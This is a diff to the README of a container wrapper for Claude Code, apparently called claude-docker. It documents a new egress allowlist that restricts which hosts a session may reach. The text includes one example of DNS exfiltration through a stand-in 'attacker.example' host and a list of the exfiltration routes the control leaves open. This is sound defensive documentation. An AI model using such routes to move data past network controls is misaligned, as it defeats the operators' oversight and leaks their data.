@@ -21,6 +21,7 @@ Credentials are opt-in per run — the [Credential opt-in](#credential-opt-in) t
 | `--api` | Claude Code talks to your LLM gateway (LiteLLM, enterprise proxy) instead of the in-container OAuth login. `ANTHROPIC_BASE_URL` and the `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY` credential go to the per-session **auth proxy sidecar**; the agent container gets a sidecar base URL and placeholders. `ANTHROPIC_CUSTOM_HEADERS` / `ANTHROPIC_MODEL` / `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL` / `ANTHROPIC_SMALL_FAST_MODEL` / `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS` / `CLAUDE_CODE_MAX_CONTEXT_TOKENS` are forwarded by name when set. Optional private CA via `CLAUDE_DOCKER_API_CA`. Bedrock/Vertex are not covered yet. See [Custom model endpoint](#custom-model-endpoint). |
 | `--api-direct` | Same as `--api`, but forwards the base URL and credential into the agent container too — no sidecar. Mutually exclusive with `--api`. |
 | `--egress-lock` | With `--api` or `--api-direct`: **lock model traffic** to the `ANTHROPIC_BASE_URL` endpoint and log the connections that go through its proxy; see [API egress lock](#api-egress-lock). |
+| `--egress-allowlist[=FILE]` | With `--egress-lock`: **refuse every host** except the model endpoint and the hosts in one allowlist file; see [Egress allowlist](#egress-allowlist). |
 
 Combine as needed: `claude-docker --aws --gh ~/repo`. Each proxied flag and its `-direct` variant are mutually exclusive: pass `--gh` or `--gh-direct`, `--glab` or `--glab-direct`, `--api` or `--api-direct`, never both of a pair.
 
@@ -294,7 +295,7 @@ Under `--az`, `CLAUDE_DOCKER_AZ_CA` (PEM) is mounted read-only and installed int
 
 ## API egress lock
 
-`--egress-lock` (with `--api` or `--api-direct`) locks Claude Code's **model traffic** to your `ANTHROPIC_BASE_URL` gateway and logs every connection that goes through its proxy, so you can show a customer that prompts only went to, say, an EU-hosted gateway. Everything else (git, npm, PyPI, the web) stays reachable: only model traffic is restricted, and there is no allowlist to maintain. It is a separate opt-in because most gateway users don't need it: plain `--api` / `--api-direct` sessions, and sessions without either, are unchanged. `--egress-lock` without one of them refuses to start.
+`--egress-lock` (with `--api` or `--api-direct`) locks Claude Code's **model traffic** to your `ANTHROPIC_BASE_URL` gateway and logs every connection that goes through its proxy, so you can show a customer that prompts only went to, say, an EU-hosted gateway. Everything else (git, npm, PyPI, the web) stays reachable: only model traffic is restricted, and there is no allowlist to maintain. To refuse everything else too, add [`--egress-allowlist`](#egress-allowlist). It is a separate opt-in because most gateway users don't need it: plain `--api` / `--api-direct` sessions, and sessions without either, are unchanged. `--egress-lock` without one of them refuses to start.
 
 For a team, that is one env file and one command:
 
@@ -344,10 +345,59 @@ claude-docker: the egress log in ~/.local/state/claude-docker/egress/20260927T10
 - An `ANTHROPIC_BASE_URL` set only in `settings.docker.json` isn't visible to `run.sh`, which then refuses to start. Export it on the host instead.
 - A `CONNECT` to a provider's raw IP address isn't matched by the host deny. Claude Code never does that, and it would show up in the log.
 - A `run.sh` killed with `SIGKILL` never runs its `EXIT` trap, so that session's log is lost.
-- The endpoint pin is for Claude Code. Any other program in the session can reach every host that isn't a provider's, by design. Without TLS interception the log shows those connections, not what they carried.
+- The endpoint pin is for Claude Code. Any other program in the session can reach every host that isn't a provider's, by design, unless you add [`--egress-allowlist`](#egress-allowlist). Without TLS interception the log shows those connections, not what they carried.
 - The pin covers the model backends Claude Code has today: the Anthropic API, a gateway, Bedrock, Foundry, Anthropic on AWS or Google Cloud, Mantle and Vertex. A backend added in a later Claude Code would have to be switched off too. The CI precedence test is where that shows up when the `claude-code` pin moves.
 - The squid log doesn't list requests another program sends straight to the auth-proxy sidecar, ignoring the proxy env. Claude Code's own can't skip it, because the managed settings pin its proxy env. Those requests can only reach the sidecar's fixed upstreams, and its audit log records them while the session runs.
 - The log is only as complete as squid makes it. A request-smuggling bug, such as CVE-2026-61642 (fixed in squid 7.6, which the proxy image requires), can hide a request from the access log, though not get it past the provider deny. CI scans the proxy image for HIGH/CRITICAL CVEs like the agent image.
 - The proxy image is built once and then reused. To take up a newer Alpine squid after a security fix, remove it (`docker image rm` the `claude-docker-egress-proxy:*` tag) and the next `--egress-lock` session rebuilds it.
 - DNS closure relies on Docker ≥ 26, which stopped forwarding external queries from internal networks. Older engines leave a DNS side channel.
 - Podman isn't covered by CI. It was validated by hand on Windows 11 with rootless podman 6.0.2 (netavark), where the internal network, DNS closure and teardown behave as on Docker.
+
+## Egress allowlist
+
+`--egress-allowlist` builds on `--egress-lock` for sessions that may reach only a known set of hosts: the model gateway and, say, your on-prem Git server and package mirror. The proxy then refuses every host except the `ANTHROPIC_BASE_URL` endpoint (and, under `--api`, the auth-proxy sidecar's `claude-docker-api-proxy`) and the hosts in **one allowlist file**. It needs `--egress-lock`, and `--egress-lock` without it is unchanged.
+
+```bash
+# team.allow, kept outside every workspace
+git.corp.example            # one host, on 80 and 443
+.pkg.corp.example           # the domain and every subdomain
+registry.corp.example:8443  # a host (or .suffix) on 8443 too
+```
+
+```bash
+claude-docker --api --egress-lock --egress-allowlist=~/team.allow ~/repo
+# or, for a team, one line in the env file:  CLAUDE_DOCKER_EGRESS_ALLOWLIST=~/team.allow
+op run --env-file team-eu.env --no-masking -- claude-docker --api --egress-lock --egress-allowlist ~/repo
+```
+
+**The file is the only source.** It is `FILE` from `--egress-allowlist=FILE` (with `=`: `--egress-allowlist FILE` would make `FILE` a workspace), else the path in `CLAUDE_DOCKER_EGRESS_ALLOWLIST`. A leading `~/` is expanded. With neither, the session refuses to start; there is no default file, so a file appearing on disk never changes what a command line does. An empty file allows the endpoint only. `CLAUDE_DOCKER_EGRESS_ALLOWLIST` is read only under `--egress-allowlist`.
+
+**Format.** One entry per line: a hostname, or `.suffix` for a domain and all its subdomains (at least two labels: `.corp.example`, not `.com`), each with an optional `:port` (1-65535). Blank lines and `#` comments, also at the end of a line, are ignored, and so are surrounding spaces, tabs and a trailing CR. Entries are case-insensitive. An invalid entry is fatal, and `run.sh` names the file and line of every one. These are refused:
+
+- anything but letters, digits, `-` and `.` in a host; labels that start or end with `-`; a trailing dot; `*.example.com` (write `.example.com`);
+- IP addresses in any form (`10.0.0.5`, `10.5`, `167772165`, `0x7f000001`): list hosts by name. An `ANTHROPIC_BASE_URL` that is an IPv4 address still works;
+- the model providers' hosts (`anthropic.com`, `claude.ai`, `claude.com` and their subdomains), which the lock refuses anyway.
+
+**Ports.** Every listed name is reachable on 80 and 443, with `CONNECT` only to 443. An entry with `:port` adds that port for the names it covers; it doesn't replace 80/443. The endpoint keeps its own port, `claude-docker-api-proxy` 8080, and a `--glab` host its own port. Nothing else.
+
+**Nothing is implied.** Credential flags (`--gh`, `--gh-direct`, `--glab`, `--glab-direct`, `--tfe`, `--az`, `--aws`, `--registry`) add no hosts: list what each needs, or its traffic is refused and the end-of-session summary names the host. For example, `--tfe` needs `app.terraform.io`; `--registry` needs your feed's host; GitHub needs `github.com`, `api.github.com` and `uploads.github.com`, plus `codeload.github.com` and `objects.githubusercontent.com` for archives and release assets (`.github.com` covers the first four).
+
+**`--gh` and `--glab` with a token** run the [auth-proxy sidecar](#github-auth-proxy), which the agent can reach without squid and which forwards to its upstream regardless of the list. So under `--egress-allowlist` the session refuses to start unless `github.com`, `api.github.com` and `uploads.github.com` (for `--gh`) or the GitLab host (for `--glab`) are covered by an entry, exact or `.suffix`, and it refuses `CLAUDE_DOCKER_GH_UPSTREAM` / `CLAUDE_DOCKER_GLAB_UPSTREAM`. Without a token there is no sidecar, and their traffic goes through squid like any other.
+
+**Who can change the list.** Only the host. The file must lie outside every workspace the session mounts, read-only ones included: `run.sh` resolves its symlinks and its directory's, and those of each workspace, before comparing. The same goes for `CLAUDE_DOCKER_GH_POLICY` / `CLAUDE_DOCKER_GLAB_POLICY` snippets. The file is read once into memory, so the bytes checked, hashed and used are the same; NUL and other control bytes (except tab, CR, LF) are refused, and so is a symlink chain longer than 40 links. Keep the file, and any env file that names it, outside every workspace, and don't run an allowlist session on `$HOME`: a session that can write them can widen the list of the next session. A hard link into a workspace can't be detected by path.
+
+**DNS.** A name off the list is never resolved: squid refuses it on the name alone, before any rule that would look it up, so `CONNECT <secret>.attacker.example` can't leak `<secret>` through DNS. And before any sidecar starts, `run.sh` checks that the agent's internal network can't resolve external names at all, with two short probe containers from the agent image: one on the proxy's network must resolve `example.org` (otherwise DNS is down and the check would prove nothing), the one on the internal network must get an answer without an address. Anything else, including a timeout, aborts the session. Docker before 26 forwards DNS from internal networks and fails this check. `--egress-allowlist` runs on Docker only for now: the check isn't verified on Podman yet.
+
+**Private ranges** are reachable only through a listed name (or an `ANTHROPIC_BASE_URL` that is a private address). List on-prem hosts by name; `CLAUDE_DOCKER_ADD_HOSTS` works for names without DNS. Metadata, link-local and loopback addresses stay refused even for a listed name.
+
+**Evidence.** On top of the lock's log, the session's evidence directory gets `<start>-<id>.conf`, the squid config the proxy ran with (owner-only, written before the agent starts; the session aborts if it can't be written), and the `.meta` file gains `allowlist_file` (the resolved path), `allowlist_sha256` and `allowlist_add_hosts` (the `--add-host` entries the proxy got, which decide where a listed name connects). A changed `allowlist_sha256` between sessions shows the list changed.
+
+**Building a first list.** Run the work under `--egress-lock` alone and read the saved log: it lists every host the session reached. Review each one before you add it: a session that was misled can visit plausible-looking hosts on purpose. After that, the `egress proxy blocked:` summary at the end of each session names what was refused.
+
+**What it doesn't stop.** It narrows exfiltration; it is not a data-loss control:
+
+- Data sent through allowed hosts. The gateway receives every prompt by design. A shared host on the list (GitHub, a package registry, a multi-tenant Git server) is a channel for anyone with an account there, including with a credential an attacker puts in a prompt.
+- A `.suffix` for a zone someone else controls. squid resolves `<anything>.suffix`, so that zone's owner sees the name, can serve an upload endpoint under it, and can point it at a private address. Use a `.suffix` only for a zone your organisation controls; never `.github.io`, `.amazonaws.com`, `.blob.core.windows.net`, `.co.uk` or the like.
+- Domain fronting on shared CDNs: without TLS interception squid sees only the `CONNECT` host.
+- Routes added in a sidecar policy snippet: the sidecar can forward them without a squid log entry.
+- A list widened, by anything that could write the file or an env file, for a session that starts later.
